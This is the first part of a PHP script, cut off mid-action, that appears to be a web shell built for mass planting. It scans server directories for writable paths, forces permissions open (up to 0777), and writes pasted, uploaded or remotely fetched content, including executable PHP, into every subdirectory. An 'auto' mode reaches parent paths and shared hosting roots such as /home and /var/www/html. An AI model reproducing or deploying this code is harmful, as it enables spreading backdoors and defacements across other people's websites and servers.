<?php

error_reporting(0);

$ACCESS_TOKEN = '';
$MAX_UPLOAD_BYTES = 10 * 1024 * 1024;
$MAX_CODE_BYTES = 5 * 1024 * 1024;

$DEFAULT_ALLOWED_EXT = [
  'txt','json','csv','log','md','xml','yml','yaml','ini',
  'png','jpg','jpeg','webp','gif','bmp','ico','svg',
  'css','js','html','htm','pdf','zip','rar','7z',
  'php','phtml','phar','asp','aspx','jsp','py','rb','pl','sh','bat','exe','dll'
];

function now_time(){ return date('Y-m-d H:i:s'); }
function normalize_slash($p){ return str_replace('\\','/',$p); }

function json_out($arr){
  header('Content-Type: application/json; charset=utf-8');
  echo json_encode($arr, JSON_UNESCAPED_SLASHES);
  exit;
}
function json_error($msg){
  json_out(['ok'=>false,'time'=>now_time(),'error'=>$msg]);
}
function starts_with($haystack,$needle){
  if($needle==='') return true;
  return strncmp($haystack,$needle,strlen($needle))===0;
}
function safe_octal_perms($path){
  $p=@fileperms($path);
  if($p===false) return '????';
  return substr(sprintf('%o',$p),-4);
}
function is_within_base($realTarget,$realBase){
  $realBase=rtrim($realBase,DIRECTORY_SEPARATOR);
  if($realTarget===$realBase) return true;
  return starts_with($realTarget,$realBase.DIRECTORY_SEPARATOR);
}
function is_symlink_path($path){ return @is_link($path)?true:false; }

function sanitize_ext($name){
  $name = (string)$name;
  $name = trim($name);
  $name = str_replace("\0",'',$name);
  $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
  $ext = preg_replace('/[^a-z0-9]/','',$ext);
  return $ext;
}

function random_filename($ext){
  return bin2hex(random_bytes(6)) . '.' . $ext;
}

function scan_dirs_recursive($baseReal,$maxDepth,$maxItems,$skipSymlink,$filter){
  $items=[];
  $count=0;
  $filter=trim((string)$filter);
  $filterLower=strtolower($filter);
  $queue=[[$baseReal,0]];
  $seen=[];

  while(!empty($queue) && $count<$maxItems){
    $node=array_shift($queue);
    $path=$node[0];
    $depth=(int)$node[1];
    $real=@realpath($path);
    if($real===false) continue;
    if(!is_dir($real)) continue;
    if(!is_within_base($real,$baseReal)) continue;
    $key=$real;
    if(isset($seen[$key])) continue;
    $seen[$key]=true;
    $isLink=is_symlink_path($path) || is_symlink_path($real);
    if($skipSymlink && $isLink) continue;
    $pathNorm=normalize_slash($real);
    $perm=safe_octal_perms($real);
    $writable=@is_writable($real)?'yes':'no';
    $type=$isLink?'symlink':'dir';
    $matched=true;
    if($filterLower!==''){
      $matched=(strpos(strtolower($pathNorm),$filterLower)!==false);
    }
    if($matched){
      $items[]=[
        'path'=>$pathNorm,
        'perm'=>$perm,
        'writable'=>$writable,
        'depth'=>$depth,
        'type'=>$type
      ];
      $count++;
      if($count>=$maxItems) break;
    }
    if($maxDepth!==0 && $depth>=$maxDepth) continue;
    $children=@scandir($real);
    if(!is_array($children)) continue;
    foreach($children as $name){
      if($name==='.'||$name==='..') continue;
      $child=$real.DIRECTORY_SEPARATOR.$name;
      if(@is_dir($child)){
        if($skipSymlink && is_symlink_path($child)) continue;
        $childReal=@realpath($child);
        if($childReal===false) continue;
        if(!is_within_base($childReal,$baseReal)) continue;
        $queue[]=[ $childReal, $depth+1 ];
      }
    }
  }
  return $items;
}

function scan_files_recursive($baseReal, $maxFiles, $pattern = '*', $skipSymlink = true) {
  $files = [];
  $count = 0;
  
  if(!function_exists('fnmatch')) {
    function fnmatch($pattern, $string) {
      return preg_match("#^".strtr(preg_quote($pattern, '#'), array('\*' => '.*', '\?' => '.'))."$#i", $string);
    }
  }
  
  $queue = array($baseReal);
  $processed = array();
  
  while(!empty($queue) && $count < $maxFiles) {
    $dir = array_shift($queue);
    $realDir = @realpath($dir);
    
    if(!$realDir || !is_dir($realDir) || isset($processed[$realDir])) {
      continue;
    }
    
    $processed[$realDir] = true;
    
    $items = @scandir($realDir);
    if(!is_array($items)) continue;
    
    foreach($items as $item) {
      if($item == '.' || $item == '..') continue;
      
      $fullPath = $realDir . DIRECTORY_SEPARATOR . $item;
      $realPath = @realpath($fullPath);
      
      if(!$realPath || !is_within_base($realPath, $baseReal)) {
        continue;
      }
      
      if($skipSymlink && is_link($fullPath)) {
        continue;
      }
      
      if(is_dir($fullPath)) {
        $queue[] = $fullPath;
      } else {
        if(fnmatch($pattern, $item)) {
          $files[] = [
            'path' => normalize_slash($realPath),
            'perm' => safe_octal_perms($realPath),
            'writable' => is_writable($realPath) ? 'yes' : 'no',
            'size' => filesize($realPath),
            'type' => 'file'
          ];
          $count++;
          
          if($count >= $maxFiles) break 2;
        }
      }
    }
  }
  
  return $files;
}

function set_permissions_recursive($path, $mode) {
  $results = ['success' => 0, 'failed' => 0, 'errors' => []];
  
  if (is_file($path)) {
    if (@chmod($path, $mode)) {
      $results['success']++;
    } else {
      $results['failed']++;
      $results['errors'][] = "Failed to chmod file: $path";
    }
    return $results;
  }
  
  $queue = array($path);
  $processed = array();
  
  while(!empty($queue)) {
    $current = array_shift($queue);
    $realCurrent = @realpath($current);
    
    if(!$realCurrent || isset($processed[$realCurrent])) {
      continue;
    }
    
    $processed[$realCurrent] = true;
    
    if (@chmod($realCurrent, $mode)) {
      $results['success']++;
    } else {
      $results['failed']++;
      $results['errors'][] = "Failed to chmod directory: $realCurrent";
    }
    
    $items = @scandir($realCurrent);
    if(!is_array($items)) continue;
    
    foreach($items as $item) {
      if($item == '.' || $item == '..') continue;
      
      $fullPath = $realCurrent . DIRECTORY_SEPARATOR . $item;
      
      if(is_dir($fullPath)) {
        $queue[] = $fullPath;
      } else {
        if (@chmod($fullPath, $mode)) {
          $results['success']++;
        } else {
          $results['failed']++;
          $results['errors'][] = "Failed to chmod: $fullPath";
        }
      }
    }
  }
  
  return $results;
}

function mass_chmod_separate($path, $dir_mode, $file_mode, $max_depth = 0) {
  $results = [
    'success_dirs' => 0, 
    'success_files' => 0, 
    'failed_dirs' => 0, 
    'failed_files' => 0, 
    'errors' => [],
    'changed_items' => []
  ];
  
  $queue = [[$path, 0]];
  $processed = array();
  
  while(!empty($queue)) {
    $node = array_shift($queue);
    $current = $node[0];
    $depth = $node[1];
    
    $realCurrent = @realpath($current);
    if(!$realCurrent || isset($processed[$realCurrent])) {
      continue;
    }
    
    $processed[$realCurrent] = true;
    
    if($max_depth > 0 && $depth > $max_depth) {
      continue;
    }
    
    if(is_dir($realCurrent)) {
      $before_perm = safe_octal_perms($realCurrent);
      if (@chmod($realCurrent, $dir_mode)) {
        $results['success_dirs']++;
        $results['changed_items'][] = [
          'path' => normalize_slash($realCurrent),
          'type' => 'dir',
          'before' => $before_perm,
          'after' => safe_octal_perms($realCurrent),
          'depth' => $depth
        ];
      } else {
        $results['failed_dirs']++;
        $results['errors'][] = "Failed to chmod directory: $realCurrent (before: $before_perm)";
      }
      
      if($max_depth == 0 || $depth < $max_depth) {
        $items = @scandir($realCurrent);
        if(is_array($items)) {
          foreach($items as $item) {
            if($item == '.' || $item == '..') continue;
            
            $fullPath = $realCurrent . DIRECTORY_SEPARATOR . $item;
            $queue[] = [$fullPath, $depth + 1];
          }
        }
      }
    } else {
      $before_perm = safe_octal_perms($realCurrent);
      if (@chmod($realCurrent, $file_mode)) {
        $results['success_files']++;
        $results['changed_items'][] = [
          'path' => normalize_slash($realCurrent),
          'type' => 'file',
          'before' => $before_perm,
          'after' => safe_octal_perms($realCurrent),
          'depth' => $depth
        ];
      } else {
        $results['failed_files']++;
        $results['errors'][] = "Failed to chmod file: $realCurrent (before: $before_perm)";
      }
    }
  }
  
  return $results;
}

function make_writable($path) {
  $results = ['success' => false, 'perm_before' => '????', 'perm_after' => '????'];
  
  if (!file_exists($path)) {
    $results['error'] = "Path does not exist";
    return $results;
  }
  
  $results['perm_before'] = safe_octal_perms($path);
  
  $mode = is_dir($path) ? 0755 : 0644;
  
  if (@chmod($path, $mode)) {
    $results['success'] = true;
    $results['perm_after'] = safe_octal_perms($path);
  } else {
    $mode = is_dir($path) ? 0777 : 0666;
    if (@chmod($path, $mode)) {
      $results['success'] = true;
      $results['perm_after'] = safe_octal_perms($path);
    } else {
      $results['error'] = "Cannot change permissions";
    }
  }
  
  return $results;
}

function get_all_subdirectories($baseReal, $maxDepth = 0, $skipSymlink = true) {
  $dirs = [];
  $queue = [[$baseReal, 0]];
  $seen = [];
  
  while(!empty($queue)) {
    $node = array_shift($queue);
    $path = $node[0];
    $depth = $node[1];
    
    $real = @realpath($path);
    if($real === false || !is_dir($real) || isset($seen[$real])) {
      continue;
    }
    
    $seen[$real] = true;
    
    if($skipSymlink && is_link($path)) {
      continue;
    }
    
    $dirs[] = [
      'path' => normalize_slash($real),
      'perm' => safe_octal_perms($real),
      'writable' => @is_writable($real) ? 'yes' : 'no',
      'depth' => $depth
    ];
    
    if($maxDepth !== 0 && $depth >= $maxDepth) {
      continue;
    }
    
    $children = @scandir($real);
    if(!is_array($children)) continue;
    
    foreach($children as $name) {
      if($name === '.' || $name === '..') continue;
      
      $child = $real . DIRECTORY_SEPARATOR . $name;
      if(is_dir($child) && (!$skipSymlink || !is_link($child))) {
        $queue[] = [$child, $depth + 1];
      }
    }
  }
  
  return $dirs;
}

function write_code_to_all_dirs($baseReal, $filename, $content, $custom_ext = '', $random_name = false, $make_writable = true, $max_depth = 0) {
  $results = [
    'success' => 0, 
    'failed' => 0, 
    'errors' => [], 
    'files' => [],
    'writable_fixed' => 0
  ];
  
  $allDirs = get_all_subdirectories($baseReal, $max_depth, true);
  
  if(empty($allDirs)) {
    $results['errors'][] = "No directories found in: $baseReal";
    return $results;
  }
  
  foreach($allDirs as $dirInfo) {
    $targetDir = $dirInfo['path'];
    
    if($dirInfo['writable'] !== 'yes') {
      if($make_writable) {
        $writableResult = make_writable($targetDir);
        if($writableResult['success']) {
          $results['writable_fixed']++;
          $dirInfo['writable'] = 'yes';
          $dirInfo['perm'] = $writableResult['perm_after'];
        } else {
          $results['failed']++;
          $results['errors'][] = "Directory not writable and cannot fix: $targetDir (perm: {$dirInfo['perm']})";
          continue;
        }
      } else {
        $results['failed']++;
        $results['errors'][] = "Directory not writable: $targetDir (perm: {$dirInfo['perm']})";
        continue;
      }
    }
    
    $finalFilename = $filename;
    if($random_name) {
      if($custom_ext) {
        $ext = $custom_ext;
      } else {
        $ext = sanitize_ext($filename);
      }
      $finalFilename = random_filename($ext);
    } elseif($custom_ext && $custom_ext !== '') {
      $pathinfo = pathinfo($filename);
      $finalFilename = $pathinfo['filename'] . '.' . $custom_ext;
    }
    
    $filepath = rtrim($targetDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $finalFilename;
    
    $bytes = @file_put_contents($filepath, $content);
    if($bytes === false) {
      $results['failed']++;
      $results['errors'][] = "Failed to write file: $filepath";
      continue;
    }
    
    $filePerm = strpos($finalFilename, '.php') !== false ? 0644 : 0644;
    @chmod($filepath, $filePerm);
    
    $results['success']++;
    $results['files'][] = [
      'path' => normalize_slash($filepath),
      'size' => $bytes,
      'perm' => safe_octal_perms($filepath),
      'dir_perm' => $dirInfo['perm'],
      'depth' => $dirInfo['depth']
    ];
  }
  
  return $results;
}

function export_results_to_txt($results, $filename = 'results_export.txt') {
  header('Content-Type: text/plain; charset=utf-8');
  header('Content-Disposition: attachment; filename="' . $filename . '"');
  
  $output = "========================================\n";
  $output .= "MASS UPLOAD RESULTS EXPORT\n";
  $output .= "Generated: " . now_time() . "\n";
  $output .= "========================================\n\n";
  
  $output .= "SUMMARY:\n";
  $output .= "Success: " . $results['success'] . " files\n";
  $output .= "Failed: " . $results['failed'] . " directories\n";
  $output .= "Writable Fixed: " . $results['writable_fixed'] . " directories\n\n";
  
  $output .= "ALL UPLOADED FILES ({path}/{file} format):\n";
  $output .= "========================================\n";
  
  foreach($results['files'] as $file) {
    $output .= $file['path'] . "\n";
  }
  
  $output .= "\n\nDETAILED INFORMATION:\n";
  $output .= "========================================\n";
  
  foreach($results['files'] as $file) {
    $output .= "File: " . basename($file['path']) . "\n";
    $output .= "Path: " . $file['path'] . "\n";
    $output .= "Size: " . $file['size'] . " bytes\n";
    $output .= "Permissions: " . $file['perm'] . "\n";
    $output .= "Directory Perm: " . $file['dir_perm'] . "\n";
    $output .= "Depth: " . $file['depth'] . "\n";
    $output .= "---\n";
  }
  
  if(!empty($results['errors'])) {
    $output .= "\n\nERRORS:\n";
    $output .= "========================================\n";
    foreach($results['errors'] as $error) {
      $output .= $error . "\n";
    }
  }
  
  $output .= "\n\n========================================\n";
  $output .= "END OF REPORT\n";
  $output .= "========================================\n";
  
  echo $output;
  exit;
}

function export_chmod_results_to_txt($results, $dir_mode, $file_mode, $filename = 'chmod_results_export.txt') {
  header('Content-Type: text/plain; charset=utf-8');
  header('Content-Disposition: attachment; filename="' . $filename . '"');
  
  $output = "========================================\n";
  $output .= "MASS CHMOD RESULTS EXPORT\n";
  $output .= "Generated: " . now_time() . "\n";
  $output .= "Directory Mode: " . sprintf('%o', $dir_mode) . "\n";
  $output .= "File Mode: " . sprintf('%o', $file_mode) . "\n";
  $output .= "========================================\n\n";
  
  $output .= "SUMMARY:\n";
  $output .= "Directories Success: " . $results['success_dirs'] . "\n";
  $output .= "Directories Failed: " . $results['failed_dirs'] . "\n";
  $output .= "Files Success: " . $results['success_files'] . "\n";
  $output .= "Files Failed: " . $results['failed_files'] . "\n";
  $output .= "Total Changed: " . (count($results['changed_items'])) . " items\n\n";
  
  $output .= "ALL CHANGED ITEMS:\n";
  $output .= "========================================\n";
  
  foreach($results['changed_items'] as $item) {
    $output .= $item['path'] . " [" . $item['type'] . "]\n";
    $output .= "  Before: " . $item['before'] . " → After: " . $item['after'] . "\n";
    $output .= "  Depth: " . $item['depth'] . "\n";
    $output .= "---\n";
  }
  
  if(!empty($results['errors'])) {
    $output .= "\n\nERRORS:\n";
    $output .= "========================================\n";
    foreach($results['errors'] as $error) {
      $output .= $error . "\n";
    }
  }
  
  $output .= "\n\n========================================\n";
  $output .= "END OF REPORT\n";
  $output .= "========================================\n";
  
  echo $output;
  exit;
}

if($_SERVER['REQUEST_METHOD']==='POST'){
  if (!function_exists('hash_equals')) {
    function hash_equals($known_string, $user_input) {
      if (!is_string($known_string) || !is_string($user_input)) {
        return false;
      }
      
      $known_length = strlen($known_string);
      $user_length = strlen($user_input);
      
      if ($known_length !== $user_length) {
        return false;
      }
      
      $result = 0;
      for ($i = 0; $i < $known_length; $i++) {
        $result |= ord($known_string[$i]) ^ ord($user_input[$i]);
      }
      
      return $result === 0;
    }
  }

  if($ACCESS_TOKEN!==''){
    $t=isset($_POST['access_token'])?(string)$_POST['access_token']:'';
    if(!hash_equals($ACCESS_TOKEN,$t)) json_error('Access token invalid or missing.');
  }

  $action=isset($_POST['action'])?(string)$_POST['action']:'';
  $baseDirInput=trim(isset($_POST['base_dir'])?(string)$_POST['base_dir']:'');

  if($baseDirInput==='') json_error('Base Directory is required.');

  $baseReal=@realpath($baseDirInput);
  if($baseReal===false || !is_dir($baseReal)) json_error('Base Directory is invalid or not found.');
  if(!is_readable($baseReal)) json_error('Base Directory is not accessible (not readable).');

  if($action==='scan'){
    $maxDepth=isset($_POST['max_depth'])?(int)$_POST['max_depth']:0;
    if($maxDepth<0) $maxDepth=0;
    $maxItems=isset($_POST['max_items'])?(int)$_POST['max_items']:3000;
    if($maxItems<50) $maxItems=50;
    if($maxItems>12000) $maxItems=12000;
    $skipSymlink=isset($_POST['skip_symlink']) && (string)$_POST['skip_symlink']==='1';
    $filter=isset($_POST['filter'])?(string)$_POST['filter']:'';
    $items=scan_dirs_recursive($baseReal,$maxDepth,$maxItems,$skipSymlink,$filter);
    json_out([
      'ok'=>true,
      'time'=>now_time(),
      'base'=>normalize_slash($baseReal),
      'base_perm'=>safe_octal_perms($baseReal),
      'max_depth'=>$maxDepth,
      'max_items'=>$maxItems,
      'skip_symlink'=>$skipSymlink?'yes':'no',
      'filter'=>$filter,
      'returned'=>count($items),
      'items'=>$items
    ]);
  }

  if($action==='upload'){
    $targetInput=trim(isset($_POST['target_dir'])?(string)$_POST['target_dir']:'');
    if($targetInput==='') json_error('Target directory is required.');
    $candidate = $targetInput;
    if(substr($candidate,0,1)!=='/' && !preg_match('/^[A-Za-z]:\\\\/', $candidate)){
      $candidate = rtrim($baseReal, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $candidate;
    }
    $targetReal=@realpath($candidate);
    if($targetReal===false) json_error('Target directory not found.');
    if(!is_within_base($targetReal,$baseReal)) json_error('Target directory is outside Base Directory.');
    if(!is_dir($targetReal)) json_error('Target is not a directory.');
    if(!is_writable($targetReal)) json_error('Target directory is not writable (perm '.safe_octal_perms($targetReal).').');
    if(!isset($_FILES['file'])) json_error('No file uploaded.');
    $f=$_FILES['file'];
    if(!isset($f['error']) || $f['error']!==UPLOAD_ERR_OK){
      json_error('Upload failed (PHP upload error code: '.(isset($f['error'])?$f['error']:'?').').');
    }
    $size = isset($f['size']) ? (int)$f['size'] : 0;
    if($size<=0) json_error('Empty file.');
    if($size > $MAX_UPLOAD_BYTES) json_error('File too large. Max '.(int)($MAX_UPLOAD_BYTES/1024/1024).'MB.');
    $origName = isset($f['name']) ? (string)$f['name'] : 'file.bin';
    $ext = sanitize_ext($origName);
    $custom_ext = isset($_POST['custom_ext'])?trim((string)$_POST['custom_ext']):'';
    if($custom_ext !== '') {
      $ext = $custom_ext;
    }
    global $DEFAULT_ALLOWED_EXT;
    $allowed_ext_input = isset($_POST['allowed_ext'])?trim((string)$_POST['allowed_ext']):'';
    if($allowed_ext_input !== '') {
      $allowed_ext = array_map('trim', explode(',', $allowed_ext_input));
      $allowed_ext = array_map('strtolower', $allowed_ext);
    } else {
      $allowed_ext = $DEFAULT_ALLOWED_EXT;
    }
    if(!in_array($ext, $allowed_ext, true)){
      json_error('Extension not allowed. Allowed: '.implode(', ', $allowed_ext));
    }
    $use_random = isset($_POST['use_random']) && $_POST['use_random']==='1';
    if($use_random) {
      $newName = random_filename($ext);
    } else {
      $newName = $origName;
    }
    $dest = rtrim($targetReal, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $newName;
    $ok=@move_uploaded_file($f['tmp_name'],$dest);
    if(!$ok) json_error('Failed to move uploaded file to target directory.');
    json_out([
      'ok'=>true,
      'time'=>now_time(),
      'base'=>normalize_slash($baseReal),
      'target'=>normalize_slash($targetReal),
      'saved_as'=>normalize_slash($dest),
      'size'=>$size,
      'filename'=>$newName
    ]);
  }

  if($action==='mass_upload_recursive'){
    $massBaseInput = trim(isset($_POST['mass_base_dir'])?(string)$_POST['mass_base_dir']:'');
    if($massBaseInput==='') json_error('Mass Upload Base Directory is required.');
    
    $massBaseReal = null;
    
    if($massBaseInput === 'auto') {
      $currentPath = @realpath(__DIR__);
      if($currentPath === false) $currentPath = __DIR__;
      
      $parentPaths = [
        dirname($currentPath),
        dirname(dirname($currentPath)),
        dirname(dirname(dirname($currentPath))),
        dirname(dirname(dirname(dirname($currentPath)))),
        '/www/wwwroot',
        '/home',
        '/var/www/html'
      ];
      
      foreach($parentPaths as $path) {
        if(file_exists($path) && is_dir($path) && is_readable($path)) {
          $massBaseReal = @realpath($path);
          break;
        }
      }
      
      if(!$massBaseReal) {
        $massBaseReal = $currentPath;
      }
    } else {
      $massBaseReal = @realpath($massBaseInput);
      if($massBaseReal === false) {
        $testPath = rtrim($massBaseInput, '/\\');
        $massBaseReal = @realpath($testPath);
        if($massBaseReal === false && file_exists($testPath) && is_dir($testPath)) {
          $massBaseReal = $testPath;
        }
      }
    }
    
    if($massBaseReal===false || !is_dir($massBaseReal)) {
      json_error('Mass Upload Base Directory is invalid or not found.');
    }
    
    if(!is_readable($massBaseReal)) json_error('Mass Upload Base Directory is not readable.');
    
    $filename = isset($_POST['mass_filename'])?trim((string)$_POST['mass_filename']):'';
    $custom_ext = isset($_POST['mass_custom_ext'])?trim((string)$_POST['mass_custom_ext']):'';
    $random_name = isset($_POST['mass_random_name']) && $_POST['mass_random_name']==='1';
    $make_writable = isset($_POST['mass_make_writable']) && $_POST['mass_make_writable']==='1';
    $max_depth = isset($_POST['mass_max_depth'])?(int)$_POST['mass_max_depth']:0;
    $export_txt = isset($_POST['export_txt']) && $_POST['export_txt']==='1';
    
    if($filename==='') {
      if($custom_ext!=='') {
        $filename = 'file.' . $custom_ext;
      } else {
        $filename = 'file.txt';
      }
    }
    
    $ext = $custom_ext !== '' ? $custom_ext : sanitize_ext($filename);
    
    global $DEFAULT_ALLOWED_EXT;
    $allowed_ext_input = isset($_POST['mass_allowed_ext'])?trim((string)$_POST['mass_allowed_ext']):'';
    if($allowed_ext_input !== '') {
      $allowed_ext = array_map('trim', explode(',', $allowed_ext_input));
      $allowed_ext = array_map('strtolower', $allowed_ext);
    } else {
      $allowed_ext = $DEFAULT_ALLOWED_EXT;
    }
    
    if(!in_array($ext, $allowed_ext, true)){
      json_error('Extension not allowed. Allowed: '.implode(', ', $allowed_ext));
    }
    
    $uploadType = isset($_POST['mass_upload_type'])?(string)$_POST['mass_upload_type']:'paste';
    $content = '';
    
    if($uploadType === 'url') {
      $url = isset($_POST['mass_url_content'])?trim((string)$_POST['mass_url_content']):'';
      if($url==='') json_error('URL is required.');
      
      if(!filter_var($url, FILTER_VALIDATE_URL)) json_error('Invalid URL.');
      
      if(function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        $content = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if($httpCode !== 200 || $content === false) {
          $content = @file_get_contents($url);
          if($content === false) {
            json_error('Failed to fetch URL. HTTP code: '.$httpCode);
          }
        }
      } else {
        $content = @file_get_contents($url);
        if($content === false) {
          json_error('Failed to fetch URL. CURL not available.');
        }
      }
      
      if($content === false) {
        json_error('Failed to fetch URL content.');
      }
      
      if(strlen($content) > $MAX_UPLOAD_BYTES) {
        json_error('Content too large. Max '.(int)($MAX_UPLOAD_BYTES/1024/1024).'MB.');
      }
      
    } elseif($uploadType === 'paste') {
      $pasteContent = isset($_POST['mass_paste_content'])?(string)$_POST['mass_paste_content']:'';
      if($pasteContent==='') json_error('Paste content is empty.');
      
      if(strlen($pasteContent) > $MAX_CODE_BYTES) {
        json_error('Paste content too large. Max '.(int)($MAX_CODE_BYTES/1024/1024).'MB.');
      }
      
      $content = $pasteContent;
      
    } else {
      if(!isset($_FILES['mass_file'])) json_error('No file uploaded.');
      $f=$_FILES['mass_file'];
      
      if(!isset($f['error']) || $f['error']!==UPLOAD_ERR_OK){
        json_error('Upload failed (PHP upload error code: '.(isset($f['error'])?$f['error']:'?').').');
      }
      
      $size = isset($f['size']) ? (int)$f['size'] : 0;
      if($size<=0) json_error('Empty file.');
      if($size > $MAX_UPLOAD_BYTES) json_error('File too large. Max '.(int)($MAX_UPLOAD_BYTES/1024/1024).'MB.');
      
      $content = @file_get_contents($f['tmp_name']);
      if($content === false) json_error('Failed to read uploaded file.');
    }
    
    if($content === '') json_error('Content is empty.');
    
    $results = write_code_to_all_dirs($massBaseReal, $filename, $content, $custom_ext, $random_name, $make_writable, $max_depth);
    
    $totalDirs = count(get_all_subdirectories($massBaseReal, $max_depth, true));
    
    if($export_txt) {
      $export_filename = 'mass_upload_results_' . date('Y-m-d_H-i-s') . '.txt';
      export_results_to_txt($results, $export_filename);
    }
    
    json_out([
      'ok'=>true,
      'time'=>now_time(),
      'base'=>normalize_slash($baseReal),
      'mass_base'=>normalize_slash($massBaseReal),
      'total_directories'=>$totalDirs,
      'filename'=>$filename,
      'custom_ext'=>$custom_ext,
      'random_name'=>$random_name?'yes':'no',
      'make_writable'=>$make_writable?'yes':'no',
      'max_depth'=>$max_depth,
      'upload_type'=>$uploadType,
      'export_txt'=>$export_txt?'yes':'no',
      'results'=>$results
    ]);
  }
  
  if($action==='mass_chmod_separate'){
    $targetInput=trim(isset($_POST['target_dir'])?(string)$_POST['target_dir']:'');
    $dir_mode_input=isset($_POST['dir_mode'])?(string)$_POST['dir_mode']:'';
    $file_mode_input=isset($_POST['file_mode'])?(string)$_POST['file_mode']:'';
    $max_depth = isset($_POST['max_depth'])?(int)$_POST['max_depth']:0;
    $export_txt = isset($_POST['export_txt']) && $_POST['export_txt']==='1';
    
    if($targetInput==='') json_error('Target directory is required.');
    if($dir_mode_input==='') json_error('Directory mode is required.');
    if($file_mode_input==='') json_error('File mode is required.');
    
    $dir_mode = is_numeric($dir_mode_input) ? octdec($dir_mode_input) : octdec('0'.$dir_mode_input);
    $file_mode = is_numeric($file_mode_input) ? octdec($file_mode_input) : octdec('0'.$file_mode_input);
    
    $targetReal = null;
    $candidate = $targetInput;
    
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
      $candidate = str_replace('/', '\\', $candidate);
      $candidate = rtrim($candidate, '\\/');
      
      $targetReal = @realpath($candidate);
      
      if($targetReal === false) {
        if(file_exists($candidate)) {
          $targetReal = $candidate;
        } else {
          $testPath = $candidate . '\\';
          if(file_exists($testPath)) {
            $targetReal = $testPath;
          }
        }
      }
    } else {
      $candidate = rtrim($candidate, '/');
      $targetReal = @realpath($candidate);
      
      if($targetReal === false) {
        if(file_exists($candidate)) {
          $targetReal = $candidate;
        }
      }
    }
    
    if($targetReal === false) {
      if(substr($candidate,0,1)!=='/' && !preg_match('/^[A-Za-z]:/', $candidate)){
        $candidate = rtrim($baseReal, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $candidate;
        $targetReal = @realpath($candidate);
      }
    }
    
    if($targetReal === false || !file_exists($targetReal)) {
      json_error('Target not found.');
    }
    
    if(is_link($targetReal)) {
      json_error('Target is a symlink.');
    }
    
    $results = mass_chmod_separate($targetReal, $dir_mode, $file_mode, $max_depth);
    
    if($export_txt) {
      $export_filename = 'mass_chmod_results_' . date('Y-m-d_H-i-s') . '.txt';
      export_chmod_results_to_txt($results, $dir_mode, $file_mode, $export_filename);
    }
    
    json_out([
      'ok'=>true,
      'time'=>now_time(),
      'target'=>normalize_slash($targetReal),
      'dir_mode'=>sprintf('%o', $dir_mode),
      'file_mode'=>sprintf('%o', $file_mode),
      'max_depth'=>$max_depth,
      'export_txt'=>$export_txt?'yes':'no',
      'results'=>$results
    ]);
  }
  
  if($action==='export_scan_results'){
    $type = isset($_POST['export_type'])?(string)$_POST['export_type']:'directories';
    $items = isset($_POST['export_data'])?(string)$_POST['export_data']:'';
    
    if($items === '') {
      json_error('No data to export.');
    }
    
    $data = json_decode($items, true);
    if(!is_array($data)) {
      json_error('Invalid export data.');
    }
    
    $filename = 'scan_results_' . $type . '_' . date('Y-m-d_H-i-s') . '.txt';
    
    header('Content-Type: text/plain; charset=utf-8');
    header('Content-Disposition: attachment; filename="' . $filename . '"');
    
    $output = "========================================\n";
    $output .= "SCAN RESULTS EXPORT\n";
    $output .= "Type: " . ucfirst($type) . "\n";
    $output .= "Generated: " . now_time() . "\n";
    $output .= "Total Items: " . count($data) . "\n";
    $output .= "========================================\n\n";
    
    if($type === 'directories') {
      $output .= "DIRECTORIES LIST ({path} format):\n";
      $output .= "========================================\n";
      
      foreach($data as $item) {
        $output .= $item['path'] . "\n";
      }
      
      $output .= "\n\nDETAILED DIRECTORY INFORMATION:\n";
      $output .= "========================================\n";
      
      foreach($data as $item) {
        $output .= "Path: " . $item['path'] . "\n";
        $output .= "Permissions: " . $item['perm'] . "\n";
        $output .= "Writable: " . $item['writable'] . "\n";
        $output .= "Depth: " . $item['depth'] . "\n";
        $output .= "Type: " . $item['type'] . "\n";
        $output .= "---\n";
      }
    } elseif($type === 'files') {
      $output .= "FILES LIST ({path}/{file} format):\n";
      $output .= "========================================\n";
      
      foreach($data as $item) {
        $output .= $item['path'] . "\n";
      }
      
      $output .= "\n\nDETAILED FILE INFORMATION:\n";
      $output .= "========================================\n";
      
      foreach($data as $item) {
        $output .= "File: " . basename($item['path']) . "\n";
        $output .= "Path: " . $item['path'] . "\n";
        $output .= "Permissions: " . $item['perm'] . "\n";
        $output .= "Writable: " . $item['writable'] . "\n";
        $output .= "Size: " . $item['size'] . " bytes\n";
        $output .= "Type: " . $item['type'] . "\n";
        $output .= "---\n";
      }
    }
    
    $output .= "\n\n========================================\n";
    $output .= "END OF REPORT\n";
    $output .= "========================================\n";
    
    echo $output;
    exit;
  }
  
  if($action==='chmod_recursive'){
    $targetInput=trim(isset($_POST['target_dir'])?(string)$_POST['target_dir']:'');
    $modeInput=isset($_POST['chmod_mode'])?(string)$_POST['chmod_mode']:'';
    
    if($targetInput==='') json_error('Target directory is required.');
    if($modeInput==='') json_error('Chmod mode is required.');
    
    $mode = is_numeric($modeInput) ? octdec($modeInput) : octdec('0'.$modeInput);
    
    $targetReal = null;
    $candidate = $targetInput;
    
    $targetReal = @realpath($candidate);
    
    if($targetReal === false) {
      if(substr($candidate,0,1)!=='/' && !preg_match('/^[A-Za-z]:\\\\/', $candidate)){
        $candidate = rtrim($baseReal, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $candidate;
      }
      $targetReal = @realpath($candidate);
    }
    
    if($targetReal === false) {
      if(file_exists($candidate)) {
        $targetReal = $candidate;
      } else {
        json_error('Target not found.');
      }
    }
    
    if(!is_within_base($targetReal,$baseReal)) json_error('Target is outside Base Directory.');
    
    $results = set_permissions_recursive($targetReal, $mode);
    
    json_out([
      'ok'=>true,
      'time'=>now_time(),
      'target'=>normalize_slash($targetReal),
      'mode'=>sprintf('%o', $mode),
      'results'=>$results
    ]);
  }
  
  if($action==='scan_files'){
    $pattern = isset($_POST['file_pattern'])?trim((string)$_POST['file_pattern']):'*';
